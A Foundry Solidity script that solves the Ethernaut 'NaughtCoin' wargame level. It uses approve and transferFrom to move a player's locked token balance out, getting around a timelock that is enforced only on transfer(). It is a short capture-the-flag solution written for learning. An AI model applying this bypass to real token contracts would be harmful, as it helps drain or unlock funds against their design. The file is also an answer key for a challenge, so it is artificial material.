// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {NaughtCoin} from "../src/level15/NaughtCoin.sol";
import "forge-std/console.sol";

contract level15Exploit is Script {
    NaughtCoin naughtCoin =
        NaughtCoin(0xBaA792747BfE9d8192cf49253819Bd0382C21195);

    function run() external {
        vm.startBroadcast();
        address player = 0xa659D686d7D696D496BeB0b781AB4734A4673294;
        uint balance = naughtCoin.balanceOf(player);

        console.log("Balance: ", balance);
        naughtCoin.approve(player, balance);
        naughtCoin.transferFrom(player, address(naughtCoin), balance);
        console.log("Balance: ", naughtCoin.balanceOf(player));
        vm.stopBroadcast();
    }
}
